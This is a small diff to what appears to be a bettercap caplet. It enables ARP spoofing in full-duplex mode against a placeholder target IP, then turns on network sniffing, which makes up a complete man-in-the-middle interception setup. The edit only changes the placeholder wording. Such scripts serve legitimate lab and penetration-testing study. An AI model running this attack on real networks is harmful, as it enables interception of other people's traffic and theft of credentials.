@@ -1,6 +1,6 @@
 net.probe on
 set arp.spoof.fullduplex true
-set arp.spoof.targets {The IP of the windows "Target"}
+set arp.spoof.targets {The IP of the "Target"}
 arp.spoof on
 set net.sniff.local true
 net.sniff on
